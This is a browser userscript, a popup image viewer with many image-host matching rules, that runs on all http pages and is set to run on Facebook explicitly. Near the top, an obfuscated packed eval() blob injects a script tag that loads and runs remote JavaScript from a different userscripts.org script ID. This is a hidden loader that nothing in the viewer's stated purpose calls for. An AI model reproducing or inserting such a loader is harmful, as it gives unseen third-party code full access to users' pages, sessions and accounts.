// ==UserScript==
// @id             org.userscripts.users.kuehlschrank.MouseoverPopupImageViewer Plus
// @name           Mouseover Popup Image Viewer
// @description    Shows larger version of thumbnails.
// @version        2012.11.9
// @author         kuehlschrank
// @homepage       http://userscripts.org/scripts/show/109262
// @icon           https://s3.amazonaws.com/uso_ss/icon/109262/large.png
// @updateURL      https://userscripts.org/scripts/source/109262.meta.js
// @include        http*
// @exclude        http*depic.me/*
// @exclude        http*imagebam.com/*
// @include		   http://www.facebook.com/*
// @include		   https://www.facebook.com/*
// @exclude        http*imagevenue.com/*
// @exclude        http*sharenxs.com/*
// @exclude        http*upix.me/*
// @exclude        http*winimg.com/*
// @exclude        http*imgbox.com/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))





'use strict';

var d = document, $ = function(id) { return d.getElementById(id); }, cur = {}, hosts;

var cfg = {
	delay: GM_getValue('delay', 500),
	thumbsonly: GM_getValue('thumbsonly', true),
	context: GM_getValue('context', true),
	img: GM_getValue('img', false),
	css: GM_getValue('css', ''),
	hosts: GM_getValue('hosts', '')
};

function loadHosts() {
	hosts = [
		{r:/500px\.com\/photo\//, q:'#mainphoto'},
		{r:/abload\.de\/image/, q:'#image'},
		{r:/depic\.me\//, q:'#pic'},
		{r:/deviantart\.com\/art\//, q:['#gmi-ResViewSizer_img', 'img.smshadow']},
		{r:/fastpic\.ru\/view\//, q:'#image'},
		{r:/(fbcdn|fbexternal).*?(app_full_proxy|safe_image).+?(src|url)=(http.+?)[&\"']/, s:function(m, node) { return decodeURIComponent(m[4]); }, html:true},
		{r:/fbcdn\.net\/.+\.jpg($|\?)/, xhr:true},
		{r:/(\/\/(fbcdn-[\w\.\-]+akamaihd|[\w\.\-]+?fbcdn)\.net\/[\w\/\.\-]+?)_[a-z]\.jpg/, html:true, s:function(m, node) { if(node.outerHTML.indexOf('hovercard') > -1) return ''; return 'http:' + m[1].replace(/\/[spc][\d\.x]+/g, '') + '_n.jpg'; }},
		{r:/facebook\.com\/photo/, q:'#fbPhotoImage'},
		{r:/firepic\.org\/\?v=/, q:'.view img[src*="firepic.org"]'},
		{r:/flickr\.com\/photos\/([0-9]+@N[0-9]+|[a-z0-9_\-]+)\/([0-9]+)/, s:'http://www.flickr.com/photos/$1/$2/sizes/l/', q:'#allsizes-photo > img'},
		{r:/hotimg\.com\/image\/([a-z0-9]+)/i, s:'http://www.hotimg.com/direct/$1'},
		{r:/imagearn\.com\/image/, q:'#img', xhr:true},
		{r:/imagefap\.com\/(image|photo)/, q:'#gallery + noscript'},
		{r:/imagebam\.com\/image\//, q:'img[id]'},
		{r:/(imageban\.(ru|net)|imagerise\.com|imgnova\.com|cweb-pix\.com|sluhost\.com(\/1)?)\/show/, q:'#img_obj', xhr:true},
		{r:/imagebunk\.com\/image/, q:'#img_obj', xhr:true},
		{r:/imagehaven\.net\/img\.php/, q:'#image'},
		{r:/imagehyper\.com\/img\.php/, q:'img[src*="imagehyper.com/img"]', xhr:true},
		{r:/(imagekitty\.com|xoze\.in|imgbuck\.com)\/.+\/.+\.html/, q:'img.pic'},
		{r:/imageshack\.us\/((i|f|photo)\/|my\.php)/, q:['div.codes > div + div', '#main_image, #fullimg']},
		{r:/imageshost\.ru\/photo\//i, q:'#bphoto'},
		{r:/image(team|nice)\.org\/img/, q:'img[alt="image"]'},
		{r:/imagetwist\.com\/[a-z0-9]+\/?(.+\.html)?/, q:'img.pic', xhr:true},
		{r:/imageupper\.com\/i\//, q:'#img', xhr:true},
		{r:/imagepix\.org\/image\/(.+)\.html$/, s:'http://imagepix.org/full/$1.jpg', xhr:true},
		{r:/(img[0-9]+\.imageporter\.com\/i\/[0-9]+\/[a-z0-9]+)_t\.jpg/i, s:'http://$1.jpg', html:true, xhr:true},
		{r:/imagevenue\.com\/img\.php/, q:'#thepic'},
		{r:/imagewaste\.com\/pictures\/(.+)/, s:'http://www.imagewaste.com/pictures/big/$1', xhr:true},
		{r:/imagezilla\.net\/show\//, q:'#photo', xhr:true},
		{r:/(http:\/\/[a-z]+\.media-imdb\.com\/images\/.+?\.jpg)/, html:true, s:function(m, node) { return m[1].replace(/V1\.?_.+?\./g, ''); }},
		{r:/imgbox\.com\/([a-z0-9]+)$/i, q:'#img', xhr:true},
		{r:/(imgchili|hoooster)\.com\/show/, q:'#show_image', xhr:true},
		{r:/imgdepot\.org\/show\/(.+\.jpg)/, s:'http://imgdepot.org/images/$1', xhr:true},
		{r:/(imgrill\.com\/upload\/)small(\/.+?\.jpg)/, s:'http://$1big$2', html:true, xhr:true},
		{r:/imgtheif\.com\/image\//, q:'a > img[src*="/pictures/"]'},
		{r:/imgur\.com\/(gallery\/|r\/[a-z]+\/|[a-z0-9]+#)?([a-z0-9]{5,}[^\.,]*$)/i, s:'http://i.imgur.com/$2.jpg'},
		{r:/instagr\.am\/p\/([a-z0-9_\-]+)/i, s:'http://instagr.am/p/$1/media/?size=l'},
		{r:/itmages\.ru\/image\/view\//, q:'#image'},
		{r:/galleryhosted\.com\/[0-9A-Z]+\/(.+)/, s:'http://www.galleryhosted.com/media/images/original/$1'},
		{r:/(\/\/[a-z0-9]+\.googleusercontent\.com\/.+?)["'\)]/i, html:true, s:function(m, node) { if(node.outerHTML.match(/favicons\?|\b(Ol Rf Ep|Ol Zb ag|Zb HPb|Zb Gtb|Rf Pg)\b/)) return ''; return 'https:' + m[1].replace(/\/(s\d{2,}[ck\-]*?|w\d+-h\d+(-p)?)\//g, '/s0/'); }},
		{r:/googleusercontent\.com\/gadgets\/proxy.+?(http.+?)&/, html:true, s:function(m, node) { return decodeURIComponent(m[1]); }},
		{r:/hostingkartinok\.com\/show-image\.php.*/, q:'.image img'},
		{r:/kinopoisk\.ru\/picture\/.*/, q:'#image'},
		{r:/(lazygirls\.info\/.+_.+?\/[a-z0-9_]+)($|\?)/i, s:'http://www.$1?celebrity=a', q:'img.photo', xhr:window.location.hostname.indexOf('lazygirls.info') == -1},
		{r:/ld-host\.de\/show/, q:'#image'},
		{r:/listal\.com\/(view)?image\/([0-9]+)/, s:'http://www.listal.com/image/$2/0full.jpg', html:true},
		{r:/lostpic\.net\/\?(photo|view)/, q:'.casem img'},
		{r:/memegenerator\.net\/instance\/([0-9]+)/, s:'http://images.memegenerator.net/instances/500x/$1.jpg'},
		{r:/palmebi\.com\/(img|image)\/.+?(v|file)=(.+?\.jpg)/, s:'http://palmebi.com/$1/images/$3'},
		{r:/(photos\.modelmayhem\.com\/photos\/[0-9a-z\/]+)_m\.jpg/, html:true, s:'http://$1.jpg'},
		{r:/(photos\.modelmayhem\.com\/avatars\/[0-9a-z\/]+)_t\.jpg/, html:true, s:'http://$1_m.jpg'},
		{r:/(min\.us|minus\.com)\/l([a-z0-9]+)$/i, s:'http://i.min.us/i$2.jpg'},
		{r:/myphoto\.to\/view\/(.+)/, s:'http://img.myphoto.to/$1'},
		{r:/(panoramio\.com\/.*?photo(\/|_id=)|google\.com\/mw-panoramio\/photos\/[a-z]+\/)(\d+)/, html:true, s:'http://static.panoramio.com/photos/original/$3.jpg'},
		{r:/(\d+\.photobucket\.com\/.+\/)(\?[a-z=&]+=)?(.+\.(jpe?g|png|gif))/, s:'http://i$1$3', xhr:window.location.hostname.indexOf('photobucket.com') == -1},
		{r:/(photosex\.biz|posteram\.ru)\/.+?id=/i, q:'img[src*="/pic_b/"]', xhr:true},
		{r:/(pic4all\.eu|piggy-farm\.com)\/(images\/|view\.php\?filename=)(.+)/, s:'http://$1/images/$3'},
		{r:/piccy\.info\/view3\/(.*)\//, s:'http://piccy.info/view3/$1/orig/', q:'#mainim'},
		{r:/(badimg\.com|fotoshare\.org|image\.imagepremium\.com|imgdino\.com|imgview\.org|miragepics\.com|myadultimage\.com|picszone\.net|r70\.info|rupix\.org)\/viewer\.php\?file=(.+)/, s:'http://$1/images/$2', xhr:true},
		{r:/picshd\.com\/([a-z0-9]+)$/i, s:'http://i.picshd.com/$1.jpg'},
		{r:/picsee\.net\/([\d\-]+)\/(.+?)\.html/,s:'http://picsee.net/upload/$1/$2'},
		{r:/picturescream\.com\/\?v=/, q:'#imagen img'},
		{r:/(picxxx\.org\/)p[tm]-(\d+)/, s:'http://$1?di=$2'},
		{r:/pimpandhost\.com\/(image|guest)\//, q:'#image'},
		{r:/pixhost\.org\/show\//, q:'#show_image', xhr:true},
		{r:/pixhub\.eu\/images/, q:'.image-show img', xhr:true},
		{r:/pixroute\.com\/.+\.html$/, q:'img[id]', xhr:true},
		{r:/postimage\.org\/image\//, q:'center img'},
		{r:/(qkme\.me|quickmeme\.com\/meme)\/([a-z0-9]+)/i, s:'http://i.qkme.me/$2.jpg'},
		{r:/radikal\.ru\/.+\.html$/, q:'div > div > img'},
		{r:/screenlist\.ru\/details/, q:'#picture'},
		{r:/sharenxs\.com\/view\//, q:'#img1', xhr:true},
		{r:/skrinshot\.ru\/view\.php\?img=(\d+)/, s:'http://skrinshot.ru/files/$1.jpg'},
		{r:/image\.skins\.be\/[0-9]+\//, q:'#wallpaper_image'},
		{r:/stooorage\.com\/show\//, q:'#page_body div div img', xhr:true},
		{r:/swagirl\.com\/host\/view/, q:'img.img_full_screen'},
		{r:/turboimagehost\.com\/p\//, q:'#imageid', xhr:true},
		{r:/twitpic\.com(\/show\/[a-z]+)?\/([a-z0-9]+)($|#)/i, s:'http://twitpic.com/show/large/$2'},
		{r:/twitter\.com\/.+\/status\/.+\/photo\//, q:'img.large'},
		{r:/(upix\.me\/files\/.+\/)#(.+)/, s:'http://$1$2'},
		{r:/uppix\.net\/([0-9a-z\/]+)\.html$/i, s:'http://uppix.net/$1.jpg'},
		{r:/(upload\.wikimedia\.org\/wikipedia\/[a-z]+\/)thumb\/([a-z0-9]+\/[a-z0-9]+\/.+?\.(jpe?g|gif|png|svg))/i, html:true, s:'http://$1$2'},
		{r:/winimg\.com\/view/, q:'#image_container img'},
		{r:/yfrog\.com\/(z\/)?[a-z0-9]+$/i, q:'#main_image, #the-image img'},
		{r:/\/\/[^\?:]+\.(jpe?g|gif|png|svg)($|\?)/i}
	];
	if(cfg.hosts) {
		cfg.hosts.split(/,?[\r\n\t]+/).forEach(function(s) {
			if(!s) return;
			try {
				var h = JSON.parse(s);
				if(!h || !h.r) throw 'property r missing';
				h.r = new RegExp(h.r, 'i');
				if(h.s && h.s.indexOf('return ') > -1) h.s = new Function('m', 'node', h.s);
				if(h.q && h.q.indexOf('return ') > -1) h.q = new Function('text', h.q);
				hosts.splice(0, 0, h);
			} catch(ex) {
				GM_log('Invalid host: ' + s + '\nReason: ' + ex);
			}
		});
	}
}

function onMouseOver(e) {
	if(typeof e == 'object') {
		if(!e.shiftKey && !cur.zoom && activate(e.target)) {
			cur.cx = e.clientX;
			cur.cy = e.clientY;
			cur.timeout = window.setTimeout(onMouseOver, cfg.delay);
		}
		return;
	}
	setStatus(cur.xhr ? 'xhr' : 'loading');
	placeStatus();
	if(cur.q) {
		downloadPage(rel2abs(cur.url, window.location.href), cur.q, cur.xhr);
	} else {
		if(cur.xhr) {
			downloadImage(cur.url, cur.url);
		} else {
			setPreview(cur.url);
			checkProgress(true);
		}
	}
}

function onMouseMove(e) {
	if(e.shiftKey) return;
	cur.cx = e.clientX;
	cur.cy = e.clientY;
	var r = cur.rect;
	if(!cur.zoom && (cur.cx > r.right + 1 || cur.cx < r.left - 1 || cur.cy > r.bottom + 1 || cur.cy < r.top - 1)) return deactivate();
	placeStatus();
	if(cur.zoom) placePreview();
}

function onMouseDown(e) {
	if(e.which != 3 && !e.shiftKey) deactivate(true);
}

function onMouseOut(e) {
	if(!e.relatedTarget) deactivate();
}

function onMouseScroll(e) {
	if(cur.zoom) {
		e.preventDefault();
		cur.scale = cur.scale * ((e.detail || -e.wheelDelta) > 0 ? 0.5 : 2);
		if(cur.scale < cur.minScale) return deactivate(true);
		placePreview();
	} else {
		deactivate();
	}
}

function onKeyUp(e) {
	switch(e.keyCode) {
		case 16:
			toggleZoom();
			break;
		case 27:
			if(e.shiftKey) {
				off(d.body, 'mouseover', onMouseOver);
				deactivate();
			} else {
				deactivate(true);
			}
			break;
		case 84:
			GM_openInTab(getPreview().src);
			break;
		default:
			deactivate(true);
	}
}

function onContext(e) {
	if(cfg.context && !e.shiftKey && getPreview() && !getStatus() && toggleZoom()) {
		e.preventDefault();
	} else {
		deactivate();
	}
}

function activate(node) {
	if(node.id == 'mpiv-preview') return false;
	var info = parseLink(node) || cfg.img && parseImage(node);
	if(!info.url || info.url == cur.url || hasAcceptableSize(node, info.url)) return false;
	deactivate();
	cur = info;
	var largest = node, nodes = node.querySelectorAll('*');
	for(var i = nodes.length, n; i-- && (n = nodes[i]);) {
		if(!largest || n.clientHeight > largest.clientHeight)
			largest = n;
	}
	var quirks = d.compatMode == 'BackCompat';
	cur.node = node;
	cur.rect = largest.getBoundingClientRect();
	cur.cw = quirks ? d.body.clientWidth  : d.documentElement.clientWidth;
	cur.ch = quirks ? d.body.clientHeight : d.documentElement.clientHeight;
	on(d, 'mousemove', onMouseMove);
	on(d, 'mousedown', onMouseDown);
	on(d, 'contextmenu', onContext);
	on(d, 'keyup', onKeyUp);
	on(d, 'DOMMouseScroll', onMouseScroll);
	on(d, 'mousewheel', onMouseScroll);
	on(d, 'mouseout', onMouseOut);
	return true;
}

function deactivate(wait) {
	window.clearTimeout(cur.timeout);
	if(cur.req && typeof cur.req.abort == 'function') cur.req.abort();
	if(cur.node) cur.node.style.cursor = '';
	cur = {};
	off(d, 'mousemove', onMouseMove);
	off(d, 'mousedown', onMouseDown);
	off(d, 'contextmenu', onContext);
	off(d, 'keyup', onKeyUp);
	off(d, 'DOMMouseScroll', onMouseScroll);
	off(d, 'mousewheel', onMouseScroll);
	off(d, 'mouseout', onMouseOut);
	setStatus(false);
	setPreview(false);
	if(wait) {
		off(d.body, 'mouseover', onMouseOver);
		window.setTimeout(function() { on(d.body, 'mouseover', onMouseOver); }, 200);
	}
}

function parseLink(node) {
	if(node.parentNode.tagName == 'A') node = node.parentNode; else if(node.parentNode.parentNode.tagName == 'A') node = node.parentNode.parentNode;
	if(!(node.tagName == 'IMG' || node.tagName == 'A' && (!cfg.thumbsonly || node.querySelector('img, i') || hasBg(node) || hasBg(node.parentNode) || hasBg(node.firstElementChild)))) return false;
	var urls = parseUrls(decodeURIComponent(node.href)), html = node.outerHTML;
	if(!hosts) loadHosts();
	for(var i = 0, len = hosts.length, h, m; i < len && (h = hosts[i]); i++) {
		if(!(m = h.html ? h.r.exec(html) : arrayMatch(urls, h.r))) continue;
		return {
			url: h.hasOwnProperty('s') ? (typeof h.s == 'function' ? h.s(m, node) : replace(h.s, m)) : m.input,
			q: h.q,
			xhr: h.xhr
		};
	}
	return false;
}

function parseImage(node) {
	if((node.tagName == 'IMG' || node.tagName == 'A' && (node = node.querySelector('img')))) {
		return {
			url: node.src
		};
	}
	return false;
}

function downloadPage(url, q, xhr) {
	cur.req = GM_xmlhttpRequest({
		method: 'GET',
		url: url,
		ignoreCache: true,
		onload: function(req) {
			try {
				delete cur.req;
				var iurl = parseHtml(req.responseText, q, url);
				if(!iurl) throw 'Image URL not found in node: ' + q;
				if(hasAcceptableSize(cur.node, iurl)) {
					setStatus(false);
					return;
				}
				if(xhr) {
					downloadImage(iurl, url);
				} else {
					setPreview(iurl);
					checkProgress(true);
				}
			} catch(ex) {
				showError(ex);
			}
		},
		onerror:showError
	});
}

function downloadImage(url, referer) {
	cur.req = GM_xmlhttpRequest({
		method: 'GET',
		url: url,
		overrideMimeType:'text/plain; charset=x-user-defined',
		headers: {'Accept':'image/png,image/*;q=0.8,*/*;q=0.5','Referer':referer},
		onprogress: function(e) {
			if(e.lengthComputable) {
				var s = getStatus(), bar = s.firstElementChild;
				if(!bar) {
					bar = d.createElement('div');
					bar.style.cssText = 'opacity:0.4;background-color:#4789c6;height:100%;display:block;padding:0;border:0;margin:0';
					s.appendChild(bar);
				}
				bar.style.width = parseInt(e.loaded / e.total * 100, 10) + '%';
			}
		},
		onload: function(req) {
			try {
				delete cur.req;
				var txt = req.responseText, ui8 = new Uint8Array(txt.length);
				for(var i = txt.length; i--;) {
					ui8[i] = txt.charCodeAt(i);
				}
				var b = new Blob([ui8.buffer]);
                setPreview((window.URL || window.webkitURL).createObjectURL(b));
				checkProgress(true);
			} catch(ex) {
				showError(ex);
			}
		},
		onerror:showError
	});
}

function parseHtml(html, q, url) {
	if(typeof q == 'function') return q(html);
	var node, path, doc = d.implementation.createHTMLDocument('MPIV');
	doc.documentElement.innerHTML = html;
	if(typeof q == 'string') {
		node = doc.querySelector(q);
	} else {
		for(var i = 0, len = q.length; i < len; i++) {
			node = doc.querySelector(q[i]);
			if(node) break;
		}
	}
	if(!node) throw 'Node not found: ' + q;
	switch(node.tagName.toUpperCase()) {
		case 'IMG':
			path = node.getAttribute('src').trim();
			break;
		case 'A':
			path = node.getAttribute('href').trim();
			break;
		default:
			path = node.outerHTML.match(/https?:\/\/[.\/a-z0-9_+%\-]+\.(jpe?g|gif|png|svg)/i)[0];
	}
	return rel2abs(path, html.match(/<base[^>]+href=["']([^>]+)["']/i) ? RegExp.$1 : url);
}

function checkProgress(start) {
	if(start === true) {
		window.clearInterval(checkProgress.interval);
		checkProgress.interval = window.setInterval(checkProgress, 150);
		return;
	}
	var p = getPreview();
	if(!p) return window.clearInterval(checkProgress.interval);
	if(p.naturalHeight) {
		setStatus(false);
		window.clearInterval(checkProgress.interval);
		p.style.display = '';
		placePreview();
		cur.large = p.naturalWidth > p.clientWidth + cur.mbw || p.naturalHeight > p.clientHeight + cur.mbh;
		if(cur.large) {
			p.style.cursor = 'all-scroll';
			cur.node.style.cursor = 'all-scroll';
		}
	}
}

function placePreview() {
	var p = getPreview();
	if(!p) return;
	if(typeof cur.pw == 'undefined') {
		var s = window.getComputedStyle(p);
		cur.pw = styleInt(s, ['padding-left', 'padding-right']);
		cur.ph = styleInt(s, ['padding-top', 'padding-bottom']);
		cur.mbw = styleInt(s, ['margin-left', 'margin-right', 'border-left-width', 'border-right-width']);
		cur.mbh = styleInt(s, ['margin-top', 'margin-bottom', 'border-top-width', 'border-bottom-width']);
	}
	var cw = cur.cw, ch = cur.ch;
	if(cur.zoom) {
		var cx = cur.cx, cy = cur.cy, nw = cur.scale * p.naturalWidth, nh = cur.scale * p.naturalHeight;
		p.style.maxWidth  = 'none';
		p.style.maxHeight = 'none';
		p.style.width  = nw + 'px';
		p.style.height = nh + 'px';
		p.style.left = (cw > nw ? cw/2 - nw/2 : -1 * Math.min(1, Math.max(0, 5/3*(cx/cw-0.2))) * (nw - cw)) - (cur.pw + cur.mbw)/2 + 'px';
		p.style.top  = (ch > nh ? ch/2 - nh/2 : -1 * Math.min(1, Math.max(0, 5/3*(cy/ch-0.2))) * (nh - ch)) - (cur.ph + cur.mbh)/2 + 'px';
	} else {
		var r = cur.rect, rx = (r.left + r.right) / 2, ry = (r.top + r.bottom) / 2;
		p.style.maxWidth  = cw - cur.pw - cur.mbw + 'px';
		p.style.maxHeight = ch - cur.ph - cur.mbh + 'px';
		p.style.width  = 'auto';
		p.style.height = 'auto';
		var w = p.clientWidth + cur.mbw, h = p.clientHeight + cur.mbh;
		var x = Math.min(cw - w, Math.max(0, r.left + (w && rx > cw/2 ? -w -20 : r.width  + 20)));
		var y = Math.min(ch - h, Math.max(0, r.top  + (h && ry > ch/2 ? -h -20 : r.height + 20)));
		if(h < ch - 80 && (x > r.right || x + w < r.left)) {
			y = Math.min(Math.max(ry - h/2, 40), ch - h - 40);
		} else if(w < cw - 80 && (y > r.bottom || y + h < r.right)) {
			x = Math.min(Math.max(rx - w/2, 40), cw - w - 40);
		}
		p.style.left = x + 'px';
		p.style.top  = y + 'px';
	}
}

function placeStatus() {
	var s = getStatus();
	if(s) {
		s.style.left = cur.cx + 'px';
		s.style.top  = cur.cy + 'px';
	}
}

function toggleZoom() {
	var p = getPreview();
	if(!p || !p.naturalHeight) return;
	p.style.cursor = '';
	cur.node.style.cursor = '';
	cur.zoom = !cur.zoom;
	cur.scale = cur.minScale = cur.large ? 1 : Math.min((cur.cw - cur.mbw)/p.naturalWidth, (cur.ch - cur.mbh)/p.naturalHeight);
	placePreview();
	return cur.zoom;
}

function showError(o) {
	setStatus('error');
	if(!o.responseText && !o.target) GM_log(o);
}

function getStatus() {
	return $('mpiv-status');
}

function setStatus(status) {
	var s = getStatus();
	if(!s && !status) return;
	if(!s) {
		s = d.createElement('div');
		s.id = 'mpiv-status';
		s.style.cssText = 'display:none;border:1px solid gray;background:white center no-repeat;position:fixed;z-index:300000;margin:20px 0 0 20px;padding:0;display:block;height:40px;width:40px;border-radius:8px;background-clip:padding-box;overflow:hidden;';
		d.body.appendChild(s);
	}
	if(status) {
		var srcs = {
			loading:'data:image/gif;base64,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',
			xhr:'data:image/gif;base64,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',
